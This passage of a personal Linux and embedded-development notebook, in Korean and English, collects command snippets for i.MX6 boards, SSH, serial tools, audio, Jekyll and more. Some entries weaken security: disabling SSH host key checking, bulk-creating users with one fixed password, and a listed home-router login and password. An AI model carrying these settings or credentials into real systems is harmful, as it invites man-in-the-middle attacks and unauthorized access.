    root@imx6qsabresd:~# stressapptest -s 60 -f /mnt/file1 -f /mnt/file2 -M 512 -m 2 -C 2 -W -n 192.168.10.10 -l test.log
    ```
    
    pc 에서 서버 모드로 실행. client 를 먼저 실행하거나 서버의 실행시간을 더 길게 하여야 한다. client 종료되기 전에 서버가 먼저종료되면 에러가 발생한다.  
    
    ```text
    $ stressapptest -s 60 --listen
    ```
3.  링크  
    <https://github.com/stressapptest/stressapptest>  
    <https://www.imx6rex.com/software/stress-testing-stressapptest/>


### <span class="section-num">3.224</span> fuser command to forcefully unmount a disk partition {#fuser-command-to-forcefully-unmount-a-disk-partition}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-04-09 화 16:13&gt;</span></span>  

```text
$ sudo fuser -km /mnt
```

-k : Kill processes accessing the file.  
-m : Name specifies a file on a mounted file system or  
a block device that is mounted  


### <span class="section-num">3.225</span> check cpu and hard disk temperature {#check-cpu-and-hard-disk-temperature}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-04-09 화 17:59&gt;</span></span>  

```text
$ apt install lm-sensors hddtemp
$ sudo sensors-detect
$ sensors
$ sudo hddtemp /dev/sda
```

gui tool  

```text
$ apt install psensor
$ psensor
```


### <span class="section-num">3.226</span> ssh automatically accept keys {#ssh-automatically-accept-keys}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-04-24 수 15:42&gt;</span></span>  
ssh 를 이용한 shell scpript 등의 작성시  

```text
The authenticity of host '192.168.0.79 (192.168.0.79)' can't be established.
RSA key fingerprint is SHA256:O/IpIWlkhtJfy3/nTNb5qA156GBLn2xADn79DNJxuMM.
Are you sure you want to continue connecting (yes/no)?
```

와 같이 호스트 키를 추가하는 메시지나  

```text
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
Someone could be eavesdropping on you right now (man-in-the-middle attack)!
It is also possible that a host key has just been changed.
The fingerprint for the RSA key sent by the remote host is
SHA256:XW7Mhuzmgv0J85FyP8i+lOghOb0Ea1mtACZoer5dYbE.
Please contact your system administrator.
Add correct host key in /home/ybgwon/.ssh/known_hosts to get rid of this message.
Offending RSA key in /home/ybgwon/.ssh/known_hosts:101
  remove with:
  ssh-keygen -f "/home/ybgwon/.ssh/known_hosts" -R 192.168.0.114
RSA host key for 192.168.0.114 has changed and you have requested strict checking.
Host key verification failed.
```

와 같이 호스트 키가 변경된 경우에 나타나는 메시지를 출력하며더이상 자동 진행이 안되는 경우의 해결법이다.  

1.  먼저 호스트 키가 변경되었을 수가 있으니 호스트 키를 지운다.  
    
    ```text
    $ ssh-keygen -R 192.168.0.79
    ```
2.  호스트 키를 추가한다.  
    
    ```text
    $ ssh-keyscan -H 192.168.0.79 >> ~/.ssh/known_hosts
    ```


#### <span class="section-num">3.226.1</span> dropbear {#dropbear}

임베디드 디바이스에는 ssh 을 위해 보통 dropbear가 포팅되어 있다.  
dropbear ssh 의 경우 y 옵션을 사용하면 key check를 생략할 수 있지만  
scp 의 경우는 아래와 같이 하여야 한다.  

1.  dbclient-noask 프로그램 작성  
    
    ```text
    #!/bin/sh
    exec dbclient -y "$@"
    ```
2.  scp 에서 -S 옵션 사용  
    
    ```text
    $ scp -S ./dbclient-noask testfile 192.168.0.79:
    ```

1.   링크

    <https://lists.ucc.gu.uwa.edu.au/pipermail/dropbear/2010q4/001078.html>  


### <span class="section-num">3.227</span> nvidia 그래픽 카드로 인해 리눅스 설치가 안될 때 {#nvidia-그래픽-카드로-인해-리눅스-설치가-안될-때}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-04-30 화 18:59&gt;</span></span>  
부트로더에 진입하여 아래 옵션을 kernel cmd line 에 추가한다.  

```text
nouveau.modeset=0
```

<https://github.com/Antergos/Cnchi/issues/503>  


### <span class="section-num">3.228</span> nomachine NX technology remote desktop {#nomachine-nx-technology-remote-desktop}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-05-02 목 12:53&gt;</span></span>  


#### <span class="section-num">3.228.1</span> install or update {#install-or-update}

```text
$ sudo NX_INSTALL_PREFIX=/opt dpkg -i nomachine_6.6.8_5_amd64.deb 
```


#### <span class="section-num">3.228.2</span> remove {#remove}

```text
$ sudo dpkg -r nomachine
if you want purge
$ sudo rm -rf /opt/NX
```


#### <span class="section-num">3.228.3</span> server start stop by systemd {#server-start-stop-by-systemd}

systemd nxserver unit 을 이용할 수 있다.  

```text
$ sudo systemctl start nxserver
```


#### <span class="section-num">3.228.4</span> server start stop by nxserver {#server-start-stop-by-nxserver}

이미 nxserver.service 가 active 상태인 경우 tray 아이콘 을 클릭하면나타나는 popup 에서 제어하거나 nxserver command line 을 이용하여  
start stop status 명령을 내릴 수 있다.  
단 트레이의 아이콘영역에는 업데이트 되지않는 버그가 있다.  

```text
$ sudo /opt/NX/bin/nxserver --help
$ sudo /opt/NX/bin/nxserver --stop
NX> 111 New connections to NoMachine server are disabled.
$ sudo /opt/NX/bin/nxserver --start
NX> 111 New connections to NoMachine server are enabled.
$ sudo /opt/NX/bin/nxserver --status
NX> 111 New connections to NoMachine server are enabled.
NX> 162 Enabled service: nxserver.
NX> 162 Enabled service: nxnode.
NX> 162 Enabled service: nxd.
```


### <span class="section-num">3.229</span> simple web server {#simple-web-server}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-05-02 목 19:05&gt;</span></span>  

```text
python -m SimpleHTTPServer
# or the Python 3 equivalent
python3 -m http.server
```

[stackexchange](https://unix.stackexchange.com/questions/32182/simple-command-line-http-server)  


### <span class="section-num">3.230</span> git ignore {#git-ignore}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-05-03 금 18:26&gt;</span></span>  
프로젝트를 시작할 때 gitignore 파일 템플릿을 제공한다.  
아래 shell 함수를 추가하고 gi 명령으로 ignore 파일을 받아온다.  

```text
$ cat > ~/bin/my_func
function gi() { curl -sL https://www.gitignore.io/api/$@ ;}
$ . my_func
$ gi linux,c,tags >> .gitignore
```


### <span class="section-num">3.231</span> simple ftp server {#simple-ftp-server}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-05-07 화 11:57&gt;</span></span>  

```text
$ python -m pyftpdlib
```

[stackoverflow](https://stackoverflow.com/questions/4994638/one-line-ftp-server-in-python)  


### <span class="section-num">3.232</span> android restart command line {#android-restart-command-line}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-05-14 화 14:55&gt;</span></span>  

```text
$ adb shell am broadcast -a android.intent.action.BOOT_COMPLETED
```

<https://stackoverflow.com/questions/18075683/restart-android-machine>  


### <span class="section-num">3.233</span> android shutdown command line {#android-shutdown-command-line}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-05-14 화 15:23&gt;</span></span>  

```text
$ adb shell su -c 'am start -a android.intent.action.ACTION_REQUEST_SHUTDOWN --ez KEY_CONFIRM true --activity-clear-task'
```

[stackexchange](https://android.stackexchange.com/questions/47989/how-can-i-shutdown-my-android-phone-using-an-adb-command)  


### <span class="section-num">3.234</span> imx gstreamer image display {#imx-gstreamer-image-display}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-05-28 화 14:37&gt;</span></span>  

```text
$ gst-launch-1.0 filesrc location=ttt2.png ! decodebin ! imagefreeze ! imxv4l2sink
```


### <span class="section-num">3.235</span> Disable SSH host key checking {#disable-ssh-host-key-checking}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-05-28 화 15:04&gt;</span></span>  
ssh 접속시 host key 체크하는 부분이 로컬에서 임베디드 디바이스등을개발하는 경우에는 성가시게 되는데 설정을 변경하여 기능을 사용하지않도록 할 수 있다.  

```text
$ cat ~/.ssh/config
Host 192.168.0.*
   StrictHostKeyChecking no
   UserKnownHostsFile /dev/null
```

<https://www.shellhacks.com/disable-ssh-host-key-checking/>  


### <span class="section-num">3.236</span> QtQml/QQmlApplicationEngine: No such file or directory {#qtqml-qqmlapplicationengine-no-such-file-or-directory}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-06-04 화 13:41&gt;</span></span>  
add below pro file  

```text
QT += qml
```

[qt-forum](https://forum.qt.io/topic/86953/qtqml-qqmlapplicationengine-no-such-file-or-directory)  


### <span class="section-num">3.237</span> core dump {#core-dump}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-06-05 수 12:23&gt;</span></span>  

```text
$ ulimit -c
unlimited
```

위와 같이 core file 이 생성되도록 설정 되었는데도 core 파일이생성되지 않는 경우  

```text
$ cat /proc/sys/kernel/core_pattern
|/bin/false
```

core\_pattern을 변경하여서 해결  

```text
$ echo core > /proc/sys/kernel/core_pattern
```

[linux-audit](https://linux-audit.com/understand-and-configure-core-dumps-work-on-linux/)  


### <span class="section-num">3.238</span> i.mx6 boot dip switch setting {#i-dot-mx6-boot-dip-switch-setting}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-06-14 금 10:17&gt;</span></span>  

1.  sd2(J500) boot
2.  sd3(J507) boot
3.  eMMC boot


### <span class="section-num">3.239</span> docker arm {#docker-arm}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-06-21 금 16:28&gt;</span></span>  
arm container 를 실행하는 방법이다.  

1.  enable Arm/Arm64 on Intel  
    
    ```text
    $ docker run --rm --privileged hypriot/qemu-register
    ```
2.  run arm based container  
    
    ```text
    $ docker run -it dieterreuter/alpine-arm64:3.9
    ```

<https://blog.hypriot.com/post/docker-intel-runs-arm-containers/>  


### <span class="section-num">3.240</span> virtual serial port {#virtual-serial-port}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-07-17 수 11:34&gt;</span></span>  

```text
$ socat -d -d pty,raw,echo=0 pty,raw,echo=0
2019/07/17 10:37:51 socat[7357] N PTY is /dev/pts/11
2019/07/17 10:37:51 socat[7357] N PTY is /dev/pts/12
2019/07/17 10:37:51 socat[7357] N starting data transfer loop with FDs [6,6] and [8,8]
```

/dev/pts/11, /dev/pts/12를 이용하여 시리얼 통신을 테스트 할 수 있다.  

pyserial 을 사용하려면 rtscts=True,dsrdtr=True 을 주어야 에러를 피할 수 있다.  

```text
ser = serial.Serial('/dev/pts/11', 115200, rtscts=True,dsrdtr=True)
```


#### <span class="section-num">3.240.1</span> 링크 {#링크}

<https://stackoverflow.com/questions/2291772/virtual-serial-device-in-python>  
[pyserial-stackoverflow](https://stackoverflow.com/questions/34831131/pyserial-does-not-play-well-with-virtual-port)  
<https://pythonhosted.org/pyserial/tools.html#module-serial.tools.miniterm>  


### <span class="section-num">3.241</span> INTERCEPTTY serial monitor {#interceptty-serial-monitor}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-07-17 수 15:15&gt;</span></span>  
 모니터할 디바이스가 첫번째 인수  
 applications 에서 사용할 링크가 두번째 인수  

```text
$ interceptty /dev/ttymxc4 /tmp/ttytmp
< 0x41 (A)
< 0x54 (T)
< 0x5a (Z)
< 0x0d
< 0x0a
...
```

시리얼 프로그램에서 /tmp/ttytmp 파일을 열고 통신을 하면위와 같이 모니터 된다.  

interceptty-nicedump 출력을 라인단위로 보기좋게 출력할 수 있다.  

```text
$ interceptty -s 'ispeed 115200 ospeed 115200' -l /dev/ttymxc4 /dev/ttytmp | interceptty-nicedump
<  41 54 0d 0a                   | AT        
<  41 54 5a 0d 0a                | ATZ  
```

[interceptty](http://web.archive.org/web/20150503060428/http://www.suspectclass.com/sgifford/interceptty)  


### <span class="section-num">3.242</span> helm shortcut {#helm-shortcut}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-07-18 목 12:35&gt;</span></span>  


#### <span class="section-num">3.242.1</span> C-] {#c}

toggle detail  


#### <span class="section-num">3.242.2</span> C-space {#c-space}

toggle mark  


#### <span class="section-num">3.242.3</span> C-c C-k {#c-c-c-k}

Kill display value of candidate and quit  
(with prefix arg, kill the real value).  


### <span class="section-num">3.243</span> picocom 사용법 {#picocom-사용법}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-07-19 금 11:48&gt;</span></span>  
LTE 모뎀에 AT command 사용 예시 이다.  

```text
$ picocom -b 115200 -e b -c --omap lfcrlf /dev/ttymxc4
```

-b baudrate 115200 설정  
-e escape character 로 b 설정. minicom과 겹치지 않도록  
default a 대신 b로 설정함. C-b C-x 로 종료됨.  
-c local echo 설정  
&#x2013; omap lfcrlf: map LF to CR + LF  
AT command 사용시 마지막에 \r\n 을 추가하여야 하는데리눅스는 return 입력시 \n 이 사용되므로 변경.  

&#x2013;exit-after 이나 &#x2013;exit 옵션을 사용하면 특정 시간(in milliseconds)동안대기후 바로 빠져 나올 수 있다.  

```text
$ picocom -b 115200 -e b -c -t $(echo -ne "AT\r") -x 1000 --omap crcrlf /dev/ttytmp
```

-t 옵션으로 디바이스 오픈하고 설정후 바로 문자를 전송할 수 있는데  
echo 를 사용하여 $(echo -ne "AT\r\n")를 해보았지만 \n에 해당하는 0x0a  
값이 전송되지 않는다. 위와 같이  \r(0x0d)를 &#x2013;omap crcrlf 를 하여 map 하는방법밖에 동작하지 않았다.  
또 map 하지 않은 상태에서 picocom 실행후 키보드 Enter를 입력하면  
\r(0x0d)값만 전송이 된다.  


### <span class="section-num">3.244</span> Date and Time {#date-and-time}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-07-22 월 11:01&gt;</span></span>  


#### <span class="section-num">3.244.1</span> date command {#date-command}

1.   set date

    ```text
    $ date -s "2017-06-27 14:53:00"
    ```

2.   show date

    ```text
    $ date "+%F %T"
    2018-07-19 10:16:38
    ```
    
    %F - full date. same as %Y-%m-%d  
    %T - time. same as %H:%M:%S  

3.   link

    [linnode](https://www.linode.com/docs/tools-reference/tools/use-the-date-command-in-linux/)  
    <https://www.howtoforge.com/linux-date-command/>  


#### <span class="section-num">3.244.2</span> timedatectl command {#timedatectl-command}

1.   show current settings

    ```text
          Local time: Thu 2018-07-19 10:23:37 UTC
      Universal time: Thu 2018-07-19 10:23:37 UTC
            RTC time: Sat 2000-01-01 01:08:38
           Time zone: Universal (UTC, +0000)
     Network time on: yes
    NTP synchronized: no
     RTC in local TZ: no
    ```

2.   set time

    ```text
    $ timedatectl set-time '2015-11-20 16:14:50'
    ```

3.   Enable network time synchronization

    true 일경우 systemctl enable &#x2013;now systemd-timesyncd.servic  
    명령을 수행한다. false 일 경우 그 반대이다.  
    
    ```text
    $ timedatectl set-ntp true
    $ systemctl status systemd-timesyncd.service
    ● systemd-timesyncd.service - Network Time Synchronization
    ```
    
    network time synchronization 이 enable 되면  
    timedatectl set-time 명령을 사용할 수 없다.  
    timedatectl set-ntp false 를 하고 set-time을 하여야 한다.  
    date -s 를 이용한 시간 설정은 가능하다.  


### <span class="section-num">3.245</span> 특정 라인만 출력하기 {#특정-라인만-출력하기}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-08-12 월 18:52&gt;</span></span>  

```text
$ sed -n '10,20p' york.txt
```

[stackoverflow](https://stackoverflow.com/questions/19327556/get-specific-line-from-text-file-using-just-shell-script)  


### <span class="section-num">3.246</span> audio recording {#audio-recording}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-08-23 금 16:17&gt;</span></span>  

```text
$ arecord test.wav
```

Unsigned 8 bit, 8000 Hz 비율, 모노로 녹음. default file type은  
wave 이다. C-c 입력하여 빠져 나옴.  


#### <span class="section-num">3.246.1</span> 옵션 {#옵션}

-f 옵션을 사용하여 녹음 포맷을 지정할 수 있다.  

```text
-f cd 
```

16 bit little endian, 44100, stereo 아래 옵션의 shortcut이다.  

```text
-f S16_LE -c2 -r44100
```

-d 옵션을 사용하여 녹음 시간을 조정할 수 있다.  

```text
$ arecord -d 10 -f cd out.wav
```

10초 동안 16 bit little endian, 44100, stereo로 녹음하여  
out.wav 파일로 저장  


#### <span class="section-num">3.246.2</span> volume {#volume}

capture 볼륨값 가져오기  

```text
$ amixer get Capture
Simple mixer control 'Capture',0
  Capabilities: cvolume cswitch
  Capture channels: Front Left - Front Right
  Limits: Capture 0 - 63
  Front Left: Capture 40 [63%] [6.75dB] [on]
  Front Right: Capture 40 [63%] [6.75dB] [on]
```

capture 볼륨값 설정  

```text
$ amixer set Capture 80%
```

1.   볼륨값 파일에 저장

    amixer set 을 하여도 값이 파일에 쓰여지지는 않기 때문에전원을 내려버리면 저장이 되지 않는다. reboot 명령을 사용하면  
    imx 보드의 경우 현재 값이 저장이 된다.  
    수동으로 하려면  
    
    ```text
    /var/lib/alsa/asound.state
    ```
    
    위 파일을 편집하여야 한다.  


### <span class="section-num">3.247</span> QApplication Without Display {#qapplication-without-display}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-09-20 금 17:38&gt;</span></span>  
임베디드 보드에서 display 없이 Qt를 사용할 경우 아래 에러가 난다.  

```text
root@imx6qpdlsolox:~/BeaconBMS# ./BeaconBMS 
QXcbConnection: Could not connect to display :0
Aborted (core dumped)
```

offscreen 옵션 설정으로 해결할 수 있다.  

```text
root@imx6qpdlsolox:~/BeaconBMS# ./BeaconBMS -platform offscreen
```

[stackoverflow](https://stackoverflow.com/questions/17979185/qt-5-1-qapplication-without-display-qxcbconnection-could-not-connect-to-displ)  


### <span class="section-num">3.248</span> user add auto script {#user-add-auto-script}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-09-24 화 13:39&gt;</span></span>  
user명과 passwd를 가지고 자동으로 추가하는 스크립트  

```text
$ for i in {1..100}; do useradd -m -p $(openssl passwd -1 'mypass') $i; done
```

[stackoverflow](https://stackoverflow.com/questions/2150882/how-to-automatically-add-user-account-and-password-with-a-bash-script)  


### <span class="section-num">3.249</span> curl 을 이용한 ftp file upload {#curl-을-이용한-ftp-file-upload}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-10-11 금 17:46&gt;</span></span>  

```text
$ curl -T test.wav -uuserid:password ftp://192.168.0.xxx/ --ftp-create-dirs -s -S
```

[tistory](https://revoman.tistory.com/entry/curl-curl%EC%9D%84-%EC%82%AC%EC%9A%A9%ED%95%9C-FTP-%EC%97%85%EB%A1%9C%EB%93%9C%EC%99%80-SHELL-%EC%8A%A4%ED%81%AC%EB%A6%BD%ED%8A%B8%EC%99%80%EC%9D%98-%EB%B9%84%EA%B5%90)  


### <span class="section-num">3.250</span> Kubernetes {#kubernetes}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-10-30 수 11:32&gt;</span></span>  

1.  쿠버네티스는 컨테이너화된 워크로드와 서비스를 관리하기 위한이식성이 있고, 확장가능한 오픈소스 플랫폼이다.
2.  쿠버네티스는 컨테이너를 쉽고 빠르게 배포/확장하고 관리를자동화해주는 오픈소스 플랫폼입니다


#### <span class="section-num">3.250.1</span> 배포의 발전 단계 {#배포의-발전-단계}

전통적인 배포 -> 가상화 배포 -> 컨테이너 배포  


#### <span class="section-num">3.250.2</span> 링크 {#링크}

<https://subicura.com/2019/05/19/kubernetes-basic-1.html>  
<https://www.popit.kr/kubernetes-introduction/>  


### <span class="section-num">3.251</span> github pages {#github-pages}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-10-31 목 15:30&gt;</span></span>  
github 페이지를 jekyll을 이용하여 빌드하는 내용을 기록하였다.  

1.  github 페이지를 사용할 저장소를 새로 만든다.  
    저장소 이름을 user.github.io 또는 organization.github.io  
    로 한다.  
    master branch 에 web 소스가 위치하도록 한 후  
    <https://ybgwon.github.io>  
    형식으로 접속할 수 있게된다.  
    /주의/  
    프로젝트 마다 Settings 에서 github 페이지를 구현할 수 있다이럴 경우는(프로젝트명이 linux-imx6)  
    <http://ybgwon.github.io/linux-imx6/>  
    의 형식으로 접속할 수 있으며 웹 콘텐츠는 master 브랜치나  
    master 브랜치의 docs 디렉토리 gh-pages 브랜치중 하나를선택할 수 있다.
2.  만든 저장소를 로컬에 복제한다.  
    
    ```text
    $ git clone git@github.com:ybgwon/ybgwon.github.io.git
    $ cd ybgwon.github.io
    ```
3.  jekyll을 설치한다  
    1.  required dependencies  
        
        ```text
        $ sudo apt-get install ruby-full build-essential zlib1g-dev
        ```
    2.  환경 설정  
        
        ```text
        $ echo '# Install Ruby Gems to ~/gems' >> ~/.bashrc
        $ echo 'export GEM_HOME="$HOME/gems"' >> ~/.bashrc
        $ echo 'export PATH="$HOME/gems/bin:$PATH"' >> ~/.bashrc
        $ source ~/.bashrc
        ```
    3.  설치  
        
        ```text
        $ gem install jekyll bundler
        ```
    4.  링크  
        <https://jekyllrb.com/docs/installation/ubuntu/>
4.  새 jekyll site 를 만든다.  
    여기서 부터는 jekyll 버전(현재 4.0.0) 때문에 github 설명과 다르게 하여야 한다.  
    
    ```text
    $ jekyll new .
    ```
5.  Gemfile에서 버전을 수정한다.  
    
    ```text
     # 아래 부분 주석처리
     #gem "jekyll", "~> 4.0.0"
     # 아래 부분 주석 해제후 변경
     gem "github-pages", "202", group: :jekyll_plugins
     # 아래 부분 버전 0.11.0 으로 변경
     group :jekyll_plugins do
    gem "jekyll-feed", "~> 0.11.0"
    end
    ```
6.  업데이트 한다.  
    
    ```text
    $ bundle update
    ```
7.  github 에 push 하고 접속하여 테스트 한다.  
    
    ```text
    $ git push
    ```
8.  이후에는 콘텐츠 수정후 bundle update, push 순으로업데이트 한다.  
    
    ```text
    edit mark down or html file
    $ bundle update
    $ git push
    시간이 좀 지난후(1분?) 적용이 된다
    ```


### <span class="section-num">3.252</span> 기본 폴더 영문으로 변경하기 {#기본-폴더-영문으로-변경하기}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-11-06 수 19:30&gt;</span></span>  

```text
$ export LANG=C
$ xdg-user-dirs-gtk-update
```

<https://kuroikuma.tistory.com/90>\* Notes  


### <span class="org-todo done DONE">DONE</span> <span class="section-num">3.253</span> 매일 찾아본 영단어 단어장에 기록하여 암기하기 {#매일-찾아본-영단어-단어장에-기록하여-암기하기}

firefox 에드온에 구글 단어장으로 추가할 수 있는 기능이 있다.  
자동으로 되면 좋겠지만 선별한다는 의미도 있으므로 관심단어에대하여 클릭으로 추가할 수 있다. firefox에서 찾아본 단어는이것으로 추가하고 로컬에서 찾은 단어에 대해서는 아직방법이 없다.  


### <span class="org-todo done DONE">DONE</span> <span class="section-num">3.254</span> google sdk 업데이트 내용 파악하기 {#google-sdk-업데이트-내용-파악하기}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2014-12-11 목 11:58&gt;</span></span>  


### <span class="org-todo done CANCELED">CANCELED</span> <span class="section-num">3.255</span> 파이썬으로 모래시계 비슷한 프로그램 짜기 {#파이썬으로-모래시계-비슷한-프로그램-짜기}


### <span class="org-todo done DEFERRED">DEFERRED</span> <span class="section-num">3.256</span> 테스트 주도 개발에 대하여 공부하기 {#테스트-주도-개발에-대하여-공부하기}


### <span class="org-todo done DONE">DONE</span> <span class="section-num">3.257</span> Debug 공부하기 {#debug-공부하기}


#### <span class="org-todo done DONE">DONE</span> <span class="section-num">3.257.1</span> 커널 디버깅 할 수 있도록 빌드 {#커널-디버깅-할-수-있도록-빌드}


#### <span class="section-num">3.257.2</span> strace 사용법 {#strace-사용법}

strace는 실행 파일의 시스템 호출을 추적할 수 있는 도구이다. 함수 호출과 시스템호출을 모두 보여주는 ltrace도 있지만 대게 strace 가 더 유용하다.  

1.  test 실행파일을 추적하려 할 때

<!--listend-->

```text
기본 옵션
$ strace -o test.strace test
포크한 자식 프로세스까지 모두 추적하려 할 때
$ strace -f test
실제 시스템 호출에 걸린 시간을 표시하려면 
$ strace -T test
실행중인 프로세스에 붙이려면
$strace -p 1234(PID)
```


#### <span class="section-num">3.257.3</span> core 파일 이름과 위치 {#core-파일-이름과-위치}

프로세스 이름.프로세스를 실행한 사용자 아이디.프로세스아이디.coreㅛ  


### <span class="section-num">3.258</span> kt 홈허브 설정 {#kt-홈허브-설정}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-09-22 화 13:43&gt;</span></span>  
Id: ktuser Pass: megaap  


### <span class="section-num">3.259</span> FreeScale IMX6 {#freescale-imx6}


#### <span class="section-num">3.259.1</span> imx6 player option {#imx6-player-option}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-10-30 금 17:32&gt;</span></span>  

1.  동영상 플레이  
    
    ```text
    gst-launch filesrc location=Baby.mp4 typefind=true ! aiurdemux name=demux demux. ! queue max-size-buffers=0 max-size-time=0 ! vpudec ! mfw_v4lsink demux. ! queue max-size-buffers=0 max-size-time=0 ! beepdec ! audioconvert ! 'audio/x-raw-int, channels=2' ! alsasink
    ```
2.  영상만 잘라서 플레이  
    
    ```text
    gst-launch filesrc location=Baby.mp4 typefind=true ! aiurdemux ! vpudec ! mfw_isink axis-top=0 axis-left=0 disp-width=1366 disp-height=768
    ```
3.  동영상 잘라서 플레이  
    
    ```text
    gst-launch filesrc location=Baby.mp4 typefind=true ! aiurdemux name=demux demux. ! queue max-size-buffers=0 max-size-time=0 ! vpudec !  mfw_isink axis-top=0 axis-left=0 disp-width=1366 disp-height=768 demux. ! queue max-size-buffers=0 max-size-time=0 ! beepdec ! audioconvert ! 'audio/x-raw-int, channels=2' ! alsasink
    ```


#### <span class="section-num">3.259.2</span> lvds 출력 u-boot 옵션 {#lvds-출력-u-boot-옵션}

1.  ldb=sin0/1  
    single mode
2.  ldb=spl0/1  
    split mode. 두채널을 묶어서 고해상도 모드로 사용할 때
3.  ldb=dul0/1  
    dual mode. 복제되어 두채널 동시에 같은 영상 출력.
4.  ldb=sep0  
    separate mode. 두채널 동시에 다른 영상 출력

<!--listend-->

```text
bootargs_base=setenv bootargs quiet printk.time=0 loglevel=0 dma_debug=off maxcpus=2 video=mxcfb0:dev=ldb,LDB-1080P60,if=RGB24,bpp=32 ldb=spl0 fbmem=24M
```


#### <span class="section-num">3.259.3</span> lvds 출력 관련 설정 {#lvds-출력-관련-설정}

```text
struct fb_videomode {
        const char *name;       /* optional */
        u32 refresh;            /* optional */
        u32 xres;
        u32 yres;
        u32 pixclock;
        u32 left_margin;
        u32 right_margin;
        u32 upper_margin;
        u32 lower_margin;
        u32 hsync_len;
        u32 vsync_len;
        u32 sync;
        u32 vmode;       
        u32 flag;
};
```

1.  name: we can set it to ‘LDB-WXGA’.
2.  refresh: though it’s optional, we can set it to typical value,  
    that is, 60(60Hz refresh rate).
3.  xres: the active width, that is, 1280.
4.  yres: the active height, that is, 800.
5.  pixclock: calculate with this formula –  
    pixclock=(10^12)/clk\_freq. Here, typically, for this example, pixclock=(10^12)/71100000=14065.
6.  left\_margin/right\_margin/hsync\_len:  
    They are the same to HS Back Porch(HBP)/HS Front Porch(HFP)/HS Width(HW)
7.  upper\_margin/lower\_margin/vsync\_len:  
    Similar to horizontal timing
8.  sync: Since the timing chart tells us that hsync/vsync are active  
    low, so we don’t need to set FB\_SYNC\_HOR\_HIGH\_ACT or  
    FB\_SYNC\_VERT\_HIGH\_ACT. Moreover, clock polarity and data polarity  
    are invalid, so we set sync to be zero here.
9.  vmode: this is a progressive video mode, so set vmode to FB\_VMODE\_NONINTERLACED.
10. flag: the video mode is provided by driver, so set flag to FB\_MODE\_IS\_DETAILED.


#### <span class="section-num">3.259.4</span> pixclock 구하기 {#pixclock-구하기}

```text
dotclock = (X-resolution + left margin + right margin
           + HSYNC length) * (Y-resolution + upper margin
           + lower margin + VSYNC length) * refresh rate
         = (1024 + 168 + 16 + 136) * (768 + 30 + 2 + 6) * 60.006
         = 65.003 MHz
pixclock = 1/dotclock
         = 15384 picoseconds
```


### <span class="section-num">3.260</span> imx6 대용량 파일 복사시 죽는 문제 {#imx6-대용량-파일-복사시-죽는-문제}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-11-24 화 21:25&gt;</span></span>  

```text
root@AI video$ cp /mnt/nfs/host/video/Baby.mp4 .login[870]: root login on 'pts/0'

[  151.172341] Unable to handle kernel paging request at virtual address 7ffb22d0
[  151.179575] pgd = 80004000
[  151.182285] [7ffb22d0] *pgd=4fffc811, *pte=00000000, *ppte=00000000
[  151.188596] Internal error: Oops: 80000007 [#1] PREEMPT SMP
[  151.194172] Modules linked in: nfs lockd sunrpc vivante drm at24 adv7180_tvin ntfs isl29023 fuse
[  151.203104] CPU: 0    Not tainted  (3.0.35-2310-gc27cb38-gd80acd4 #38)
[  151.209638] pc : [<7ffb22d0>]    lr : [<80026418>]    psr: 80000193
[  151.209643] sp : 80477e40  ip : 80477e58  fp : 80477e54
[  151.221132] r10: 00000004  r9 : 412fc09a  r8 : 80494a20
[  151.226359] r7 : 20000193  r6 : 8c008040  r5 : 00000001  r4 : 804b6168
[  151.232890] r3 : 8003c4d8  r2 : 00000001  r1 : 8c008040  r0 : 0000001d
[  151.239422] Flags: Nzcv  IRQs off  FIQs on  Mode SVC_32  ISA ARM  Segment kernel
[  151.246822] Control: 10c53c7d  Table: 4d17404a  DAC: 00000015
[  151.252571] Process swapper (pid: 0, stack limit = 0x804762f8)
[  151.258407] Stack: (0x80477e40 to 0x80478000)
[  151.262770] 7e40: 8003c4d8 8c008040 80477e6c 80477e58 8008b29c 8003c4e4 804d9408 00000000
[  151.270954] 7e60: 80477ea4 80477e70 8008c4b0 8008b278 80477ee4 80477e80 8008d660 8006f548
[  151.279139] 7e80: 00000001 00000000 00000000 00000004 80477f6c 00000000 80477eec 80477ea8
[  151.287323] 7ea0: 8008ba40 8008c3a8 8c008040 60000193 253fcff0 00000023 00000000 80476000
[  151.295507] 7ec0: 8002e9d4 ffffffff 00000000 00000000 00000004 80477f6c 412fc09a 00000000
[  151.303691] 7ee0: 80477f14 80477ef0 80082dac 8008b7fc ffffffff 00000004 80477f6c 20000193
